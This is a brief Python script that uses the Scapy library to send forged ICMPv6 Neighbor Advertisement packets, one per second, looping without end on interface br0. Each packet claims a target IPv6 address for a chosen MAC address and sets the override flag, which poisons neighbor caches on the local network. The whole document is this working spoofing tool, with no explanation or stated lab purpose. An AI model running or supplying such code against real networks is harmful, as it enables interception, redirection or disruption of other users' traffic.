from scapy.all import sendp,Ether,IPv6,ICMPv6ND_NA,ICMPv6NDOptSrcLLAddr
print("start")
sendp(Ether(src="5e:6c:c9:a5:6a:4e") \
        /IPv6(src="fe80::5c6c:c9ff:fea5:6a4e",dst="fe80::25a4:1eab:bba8:77eb") \
        /ICMPv6ND_NA(tgt="3333:db8:1:0:227c:8fff:fe79:2580",R=1,S=1,O=1) \
        /ICMPv6NDOptSrcLLAddr(lladdr="5e:6c:c9:a5:6a:4e",type=2),loop=1, inter=1, iface="br0")

